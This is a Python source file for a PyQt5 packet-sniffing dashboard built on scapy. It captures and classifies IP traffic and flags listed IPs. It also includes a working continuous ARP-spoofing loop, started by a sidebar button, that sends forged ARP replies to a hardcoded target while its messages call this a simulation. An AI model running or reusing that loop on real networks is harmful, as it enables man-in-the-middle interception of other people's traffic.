import sys
import os
import csv
import time
import threading
from datetime import datetime
from collections import defaultdict, Counter, deque
from openpyxl import Workbook, load_workbook
import pandas as pd
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QVBoxLayout, QWidget, QTableWidget, QTableWidgetItem,
    QLabel, QLineEdit, QHeaderView, QStatusBar, QHBoxLayout, QPushButton, QMessageBox, QGraphicsOpacityEffect
)
from PyQt5.QtCore import Qt, QTimer, pyqtSignal, QObject, QPropertyAnimation, QRect
from PyQt5.QtGui import QColor, QPixmap
from matplotlib.backends.backend_qt5agg import FigureCanvasQTAgg as FigureCanvas
from matplotlib.figure import Figure
from scapy.all import sniff, IP, TCP, UDP, ARP, send, getmacbyip, Ether, srp
import matplotlib.pyplot as plt

# === Global Data Structures ===
SUSPICIOUS_IPS = {"192.168.1.66", "45.83.122.5", "10.0.0.99"}
LOG_FILE = "packet_log.csv"
EXCEL_FILE = "packet_log.xlsx"
SUSPECT_THRESHOLD = 100

packet_rate_counter = defaultdict(int)
bandwidth_map = defaultdict(lambda: {'sent': 0, 'received': 0})
session_tracker = defaultdict(set)
top_sources = Counter()
top_destinations = Counter()
THREAT_IPS = set()


def resolve_mac(ip):
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
        if ans:
            return ans[0][1].hwsrc
        else:
            return None
    except Exception as e:
        print(f"[!] Error resolving MAC: {e}")
        return None

def animate_button_click(button):
    original_rect = button.geometry()
    anim = QPropertyAnimation(button, b"geometry")
    anim.setDuration(150)
    anim.setStartValue(original_rect)
    anim.setKeyValueAt(0.5, QRect(original_rect.x() - 2, original_rect.y() - 2, original_rect.width() + 4, original_rect.height() + 4))
    anim.setEndValue(original_rect)
    anim.start()
    button._anim = anim

def animate_button_opacity(button):
    effect = QGraphicsOpacityEffect(button)
    button.setGraphicsEffect(effect)
    anim = QPropertyAnimation(effect, b"opacity")
    anim.setDuration(300)
    anim.setStartValue(1.0)
    anim.setEndValue(0.5)
    anim.setLoopCount(2)
    anim.setDirection(QPropertyAnimation.Backward)
    anim.start()
    button._anim_opacity = anim

if not os.path.exists(EXCEL_FILE):
    wb = Workbook()
    ws = wb.active
    ws.title = "Logs"
    ws.append(["Time", "Source", "Destination", "Protocol", "Port", "Flags", "Info"])
    wb.save(EXCEL_FILE)

# === Signals ===
class PacketSignal(QObject):
    new_packet = pyqtSignal(dict)
    alert_signal = pyqtSignal(str)

signal_manager = PacketSignal()

# === Plot Widget ===
class RealTimePlot(FigureCanvas):
    def __init__(self, parent=None):
        plt.style.use('dark_background')
        self.fig = Figure(figsize=(8, 4), facecolor='#16213e')
        self.ax1 = self.fig.add_subplot(121, facecolor='#0f3460')
        self.ax2 = self.fig.add_subplot(122, facecolor='#0f3460')
        super().__init__(self.fig)

        self.max_points = 60
        self.packet_counts = deque([0]*self.max_points, maxlen=self.max_points)
        self.timestamps = deque([i for i in range(-self.max_points+1, 1)], maxlen=self.max_points)

        self.filtered_protocol_counts = {"TCP": 0, "UDP": 0, "OTHER": 0}
        self.line_plot, = self.ax1.plot(self.timestamps, self.packet_counts, 'cyan')

        for ax in [self.ax1, self.ax2]:
            ax.tick_params(colors='white')
            ax.title.set_color('white')
            for spine in ax.spines.values():
                spine.set_color('white')

        self.ax1.set_title("Packets / Second", fontsize=9)
        self.ax1.set_xlabel("Seconds Ago")
        self.ax1.set_ylabel("Count")
        self.ax1.grid(True, color='#333333')
        self.ax2.set_title("Protocol Breakdown (Filtered)", fontsize=9)

        self.timer = QTimer()
        self.timer.timeout.connect(self.update_plot)
        self.timer.start(1000)

    def increment(self):
        self.packet_counts[-1] += 1

    def update_protocol_counts(self, protocols):
        self.filtered_protocol_counts = {"TCP": 0, "UDP": 0, "OTHER": 0}
        for p in protocols:
            if p in self.filtered_protocol_counts:
                self.filtered_protocol_counts[p] += 1
            else:
                self.filtered_protocol_counts["OTHER"] += 1

    def update_plot(self):
        self.packet_counts.append(0)
        self.timestamps.append(self.timestamps[-1] + 1)
        self.line_plot.set_ydata(self.packet_counts)
        self.line_plot.set_xdata(self.timestamps)
        self.ax1.relim()
        self.ax1.autoscale_view()

        self.ax2.clear()
        self.ax2.set_title("Protocol Breakdown (Filtered)", fontsize=9)
        protocols = list(self.filtered_protocol_counts.keys())
        values = list(self.filtered_protocol_counts.values())
        self.ax2.bar(protocols, values, color=['orange', 'purple', 'gray'])
        self.draw()

# === Main GUI ===
class NetworkAnalyzerGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Advanced Network Analyzer")
        self.setGeometry(100, 100, 1500, 800)
        self.setWindowFlags(Qt.FramelessWindowHint)

        self.packet_count = 0
        self.threat_count = 0

        # === Title Bar ===
        title_bar = QWidget()
        title_bar.setStyleSheet("background-color: #0f3460;")
        title_bar.setFixedHeight(40)

        title_layout = QHBoxLayout(title_bar)
        title_layout.setContentsMargins(10, 0, 10, 0)

        self.logo_label = QLabel()
        pixmap = QPixmap(30, 30)
        pixmap.fill(QColor(240, 84, 84))
        self.logo_label.setPixmap(pixmap)

        self.title_label = QLabel("Advanced Network Analyzer")
        self.title_label.setStyleSheet("color: white; font-size: 16px; font-weight: bold;")

        self.minimize_btn = QPushButton("─")
        self.minimize_btn.setCursor(Qt.PointingHandCursor)
        self.maximize_btn = QPushButton("🗖")
        self.maximize_btn.setCursor(Qt.PointingHandCursor)
        self.close_btn = QPushButton("✕")
        self.close_btn.setCursor(Qt.PointingHandCursor)
        for btn in [self.minimize_btn, self.close_btn, self.maximize_btn]:
            btn.setFixedSize(30, 30)
            btn.setStyleSheet("""
                QPushButton {
                    color: white;
                    border: none;
                    font-size: 16px;
                }
                QPushButton:hover {
                    background-color: rgba(255, 255, 255, 0.2);
                }
            """)

        # self.minimize_btn.clicked.connect(lambda:[self.showMinimized , animate_button_click(self.minimize_btn)])
        # self.maximize_btn.clicked.connect(lambda:[self.showMaximized , animate_button_click(self.maximize_btn)])
        # self.close_btn.clicked.connect(lambda:[self.close , animate_button_click(self.close_btn)])
        
        self.minimize_btn.clicked.connect(self.showMinimized)
        self.maximize_btn.clicked.connect(self.showMaximized)
        self.close_btn.clicked.connect(self.close)

        title_layout.addWidget(self.logo_label)
        title_layout.addWidget(self.title_label)
        title_layout.addStretch()
        title_layout.addWidget(self.minimize_btn)
        title_layout.addWidget(self.maximize_btn)
        title_layout.addWidget(self.close_btn)

        # === Sidebar ===
        self.sidebar = QWidget()
        self.sidebar.setFixedWidth(200)
        self.sidebar.setStyleSheet("background-color: #0f3460;")
        sidebar_layout = QVBoxLayout()
        sidebar_layout.setContentsMargins(10, 20, 10, 20)

        self.stats_title = QLabel("NETWORK STATS")
        self.stats_title.setStyleSheet("color: white; font-size: 14px; font-weight: bold;")
        self.stats_title.setAlignment(Qt.AlignCenter)

        self.top_sources = QLabel("Top Sources:\n-")
        self.top_destinations = QLabel("Top Destinations:\n-")
        self.protocol_dist = QLabel("Protocol Distribution:\n-")

        for label in [self.top_sources, self.top_destinations, self.protocol_dist]:
            label.setStyleSheet("color: white; font-size: 12px;")
            label.setWordWrap(True)
        self.start_attack_btn = QPushButton("Start Continuous ARP Spoof")
        self.start_attack_btn.setCursor(Qt.PointingHandCursor)
        self.stop_attack_btn = QPushButton("Stop Continuous ARP Spoof")
        self.stop_attack_btn.setCursor(Qt.PointingHandCursor)
        self.start_attack_btn.setObjectName("AttackButton")
        self.stop_attack_btn.setObjectName("AttackButton")
        self.start_attack_btn.setGraphicsEffect(None)
        self.stop_attack_btn.setGraphicsEffect(None)
        self.start_attack_btn.clicked.connect(self.start_continuous_arp_spoof)
        # self.start_attack_btn.clicked.connect(lambda:[self.start_continuous_arp_spoof , animate_button_click(self.start_attack_btn)])
        self.stop_attack_btn.clicked.connect(self.stop_continuous_arp_spoof)
        # self.stop_attack_btn.clicked.connect(lambda:[self.stop_continuous_arp_spoof , animate_button_click(self.stop_attack_btn)])

        sidebar_layout.addWidget(self.stats_title)
        sidebar_layout.addWidget(self.top_sources)
        sidebar_layout.addWidget(self.top_destinations)
        sidebar_layout.addWidget(self.protocol_dist)
        sidebar_layout.addWidget(self.start_attack_btn)
        sidebar_layout.addWidget(self.stop_attack_btn)
        sidebar_layout.addStretch()

        self.sidebar.setLayout(sidebar_layout)

        # === Main Table & Plot ===
        self.packet_table = QTableWidget()
        self.packet_table.setColumnCount(7)
        self.packet_table.setHorizontalHeaderLabels(["Source", "Destination", "Protocol", "Port", "Flags", "Time", "Info"])
        self.packet_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        self.packet_table.setEditTriggers(QTableWidget.NoEditTriggers)

        self.alert_label = QLabel("")
        self.alert_label.setStyleSheet("""
            color: #f05454;
            font-weight: bold;
            font-size: 16px;
            background-color: rgba(240, 84, 84, 0.1);
            padding: 8px;
            border-left: 4px solid #f05454;
            border-radius: 2px;
        """)

        self.filter_bar = QLineEdit()
        self.filter_bar.setPlaceholderText("🔍 Filter by IP address...")
        self.filter_bar.textChanged.connect(self.filter_table)

        self.traffic_plot = RealTimePlot()

        # === Status Bar ===
        self.status_bar = self.statusBar()
        self.packet_count_label = QLabel("Packets: 0")
        self.threat_count_label = QLabel("Threats: 0")
        self.connection_label = QLabel("Connections: 0")

        self.status_bar.addPermanentWidget(self.packet_count_label)
        self.status_bar.addPermanentWidget(self.threat_count_label)
        self.status_bar.addPermanentWidget(self.connection_label)

        # === Layouts ===
        main_layout = QVBoxLayout()
        main_layout.setContentsMargins(0, 0, 0, 0)
        main_layout.setSpacing(0)
        main_layout.addWidget(title_bar)

        content_layout = QHBoxLayout()
        content_layout.addWidget(self.sidebar)

        right_layout = QVBoxLayout()
        right_layout.addWidget(self.filter_bar)
        right_layout.addWidget(self.packet_table)
        right_layout.addWidget(self.alert_label)
        right_layout.addWidget(self.traffic_plot)

        content_layout.addLayout(right_layout)
        main_layout.addLayout(content_layout)

        container = QWidget()
        container.setLayout(main_layout)
        self.setCentralWidget(container)

        # === StyleSheet ===
        self.setStyleSheet("""
            QMainWindow {
                background-color: #1a1a2e;
            }
            QTableWidget {
                background-color: #16213e;
                color: #e6e6e6;
                gridline-color: #0f3460;
                border: 1px solid #0f3460;
                border-radius: 4px;
            }
            QHeaderView::section {
                background-color: #0f3460;
                color: white;
                padding: 5px;
                border: none;
                font-weight: bold;
            }
            QLabel {
                color: #f05454;
                font-family: 'Segoe UI';
            }
            QLineEdit {
                background-color: #16213e;
                color: white;
                padding: 8px;
                border: 1px solid #0f3460;
                border-radius: 4px;
                font-size: 14px;
            }
            QWidget QPushButton {
                background-color: #f05454;
                color: white;
                padding: 8px;
                border-radius: 4px;
            }
            QWidget QPushButton:hover {
                background-color: #f79c9c;
            }
            QWidget QPushButton:pressed {
                background-color: #e3172d;
            }
            QWidget QPushButton#AttackButton{
                background-color: #f05454;
                color: white;
                padding: 8px;
                border-radius: 4px;
            }
            QWidget QPushButton#AttackButton:hover {
                background-color: #f79c9c;
            }
            QWidget QPushButton#AttackButton:pressed {
                background-color: #e3172d;
            }
        """)

        # === Signals ===
        signal_manager.new_packet.connect(self.add_packet)
        signal_manager.alert_signal.connect(self.handle_alert)

        # === Timer to update sidebar ===
        self.sidebar_timer = QTimer()
        self.sidebar_timer.timeout.connect(self.update_sidebar_stats)
        self.sidebar_timer.start(5000)

    def handle_alert(self, msg):
        self.show_alert(msg)
        self.recolor_threat_rows()

    def recolor_threat_rows(self):
        for row in range(self.packet_table.rowCount()):
            src = self.packet_table.item(row, 0).text()
            dst = self.packet_table.item(row, 1).text()

            if src in THREAT_IPS or dst in THREAT_IPS:
                for col in range(self.packet_table.columnCount()):
                    item = self.packet_table.item(row, col)
                    if item:
                        item.setBackground(QColor(220, 20, 60).darker(150))  # Crimson
                        item.setForeground(QColor(255, 255, 255))


    def filter_table(self):
        text = self.filter_bar.text().strip().lower()
        protocols = []
        for row in range(self.packet_table.rowCount()):
            src = self.packet_table.item(row, 0)
            dst = self.packet_table.item(row, 1)
            proto = self.packet_table.item(row, 2)
            visible = text in src.text().lower() or text in dst.text().lower()
            self.packet_table.setRowHidden(row, not visible)
            if visible and proto:
                protocols.append(proto.text())
        self.traffic_plot.update_protocol_counts(protocols)

    def add_packet(self, pkt):
        filter_text = self.filter_bar.text().strip().lower()
        if filter_text:
            if filter_text not in pkt["src"].lower() and filter_text not in pkt["dst"].lower():
                return
        self.packet_count += 1
        self.packet_count_label.setText(f"Packets: {self.packet_count}")

        items = [
            QTableWidgetItem(pkt["src"]),
            QTableWidgetItem(pkt["dst"]),
            QTableWidgetItem(pkt["proto"]),
            QTableWidgetItem(pkt["port"]),
            QTableWidgetItem(pkt["flags"]),
            QTableWidgetItem(pkt["time"])
        ]

        row = self.packet_table.rowCount()
        self.packet_table.insertRow(row)
        for i, key in enumerate(["src", "dst", "proto", "port", "flags", "time", "info"]):
            item = QTableWidgetItem(pkt[key])
            item.setToolTip(f"{key.title()}: {pkt[key]}")
            item.setForeground(QColor("white"))
            self.packet_table.setItem(row, i, item)

        if pkt["proto"] == "TCP":
            color = QColor(105, 10, 225)  # Royal Blue
        elif pkt["proto"] == "UDP":
            color = QColor(50, 205, 50)   # Lime Green
        else:
            color = QColor(169, 169, 169) # Gray
        if pkt["src"] in SUSPICIOUS_IPS or pkt["dst"] in SUSPICIOUS_IPS:
            color = QColor(220, 20, 60)  # Crimson
            self.threat_count += 1
            self.threat_count_label.setText(f"Threats: {self.threat_count}")

        for col, item in enumerate(items):
            item.setBackground(color.darker(150))
            item.setForeground(QColor(255, 255, 255))
            self.packet_table.setItem(row, col, item)
            
            # Add tooltips
            tooltip_text = f"""
            <b>Detailed Packet Info:</b><br>
            Source: {pkt['src']}<br>
            Destination: {pkt['dst']}<br>
            Protocol: {pkt['proto']}<br>
            Port: {pkt['port']}<br>
            Flags: {pkt['flags']}<br>
            Time: {pkt['time']}
            """
            item.setToolTip(tooltip_text)

        self.traffic_plot.increment()
        current_protocol = pkt["proto"]
        self.traffic_plot.filtered_protocol_counts[current_protocol] = self.traffic_plot.filtered_protocol_counts.get(current_protocol, 0) + 1
        self.connection_label.setText(f"Connections: {sum(len(v) for v in session_tracker.values())}")

    def show_alert(self, msg):
        self.alert_label.setText(msg)
        self.alert_label.setGraphicsEffect(QGraphicsOpacityEffect())
        self.alert_label.graphicsEffect().setOpacity(1.0)
        fade = QPropertyAnimation(self.alert_label.graphicsEffect(), b"opacity")
        fade.setDuration(10000)
        fade.setStartValue(1.0)
        fade.setEndValue(0.0)
        fade.start()
        self.threat_count += 1
        self.threat_count_label.setText(f"Threats: {self.threat_count}")

    # def simulate_attack(self):
    #     try:
    #         send(ARP(op=2, pdst="192.168.1.5", psrc="192.168.1.1"), verbose=False)
    #         self.alert_label.setText("[SIM] ARP spoof sent!")
    #     except Exception as e:
    #         self.alert_label.setText(f"[SIM ERROR] {e}")

    def start_continuous_arp_spoof(self, target_ip="162.159.200.1", spoof_ip="162.159.200.5", interval=2):
        def spoof():
            victim_mac = resolve_mac(target_ip)
            if not victim_mac:
                self.alert_label.setText(f"[SIM ERROR] Could not resolve victim MAC.")
                self.alert_label.setGraphicsEffect(None)
                return
            self.alert_label.setText(f"[SIM] ARP spoof started (Target: {target_ip}, Spoof IP: {spoof_ip})")
            self.alert_label.setGraphicsEffect(None)
            try:
                while getattr(self, 'arp_spoof_running', True):
                    send(ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=victim_mac), verbose=False)
                    time.sleep(interval)
            except Exception as e:
                self.alert_label.setText(f"[SIM ERROR] {e}")
                self.alert_label.setGraphicsEffect(None)
        self.arp_spoof_running = True
        threading.Thread(target=spoof, daemon=True).start()
        
    def stop_continuous_arp_spoof(self):
        self.arp_spoof_running = False
        self.alert_label.setText("[SIM] ARP spoof stopped.")


    def update_sidebar_stats(self):
        self.top_sources.setText("Top Sources:\n" + "\n".join(f"{ip}: {count}" for ip, count in top_sources.most_common(5)))
        self.top_destinations.setText("Top Destinations:\n" + "\n".join(f"{ip}: {count}" for ip, count in top_destinations.most_common(5)))
        total = sum(packet_rate_counter.values())
        self.protocol_dist.setText(f"Packet Rate: {total} pps")

# === Packet Analyzer ===
def analyze_packet(packet):
    now = datetime.now()
    time_str = now.strftime("%H:%M:%S")

    if IP in packet:
        ip_layer = packet[IP]
        src = ip_layer.src
        dst = ip_layer.dst
        proto, port, flags, info = "OTHER", "-", "-", "-"
        data = bytes(packet[IP].payload)

        if TCP in packet:
            proto = "TCP"
            port = f"{packet[TCP].sport}->{packet[TCP].dport}"
            flags = str(packet[TCP].flags)
            session_tracker[src].add(f"{src}:{packet[TCP].sport}->{dst}:{packet[TCP].dport}")
        elif UDP in packet:
            proto = "UDP"
            port = f"{packet[UDP].sport}->{packet[UDP].dport}"
            session_tracker[src].add(f"{src}:{packet[UDP].sport}->{dst}:{packet[UDP].dport}")

        if b"HTTP" in data or b"GET" in data:
            info = "HTTP"
        elif b"TLS" in data or b"\x16\x03" in data:
            info = "TLS/SSL"
        elif b"\x01\x00\x00" in data:
            info = "DNS"
        else:
            preview = data[:32].decode(errors='ignore').strip()
            preview = preview.encode('ascii', errors='ignore').decode()
            info = f"Raw: {preview}" if preview else "Unclassified"

        top_sources[src] += 1
        top_destinations[dst] += 1
        bandwidth_map[src]['sent'] += len(packet)
        bandwidth_map[dst]['received'] += len(packet)
        packet_rate_counter[src] += 1

        if src in SUSPICIOUS_IPS:
             if src not in THREAT_IPS:
                THREAT_IPS.add(src)
                signal_manager.alert_signal.emit(f"[!] Threat IP Detected: {src}")
        if packet_rate_counter[src] > SUSPECT_THRESHOLD:
            signal_manager.alert_signal.emit(f"[!] High rate from {src}: {packet_rate_counter[src]} pps")

        pkt = {
            "src": src,
            "dst": dst,
            "proto": proto,
            "port": port,
            "flags": flags,
            "time": time_str,
            "info": info
        }

        signal_manager.new_packet.emit(pkt)
        with open(LOG_FILE, "a", newline='') as f:
            csv.writer(f).writerow(pkt.values())

# === Main ===
def start_sniffing():
    sniff(prn=analyze_packet, filter="ip", store=False)

def main():
    with open(LOG_FILE, "w", newline='') as f:
        csv.writer(f).writerow(["Source", "Destination", "Protocol", "Port", "Flags", "Time", "Info"])
    app = QApplication(sys.argv)
    app.setStyleSheet("""
        QPushButton {
            background-color: #f05454;
            color: white;
            padding: 8px;
            border-radius: 4px;
        }
        QPushButton:hover {
            background-color: #f79c9c;
        }
        QPushButton:pressed {
            background-color: #e3172d;
        }
    """)
    gui = NetworkAnalyzerGUI()
    gui.show()
    threading.Thread(target=start_sniffing, daemon=True).start()
    sys.exit(app.exec_())

if __name__ == "__main__":
    main()
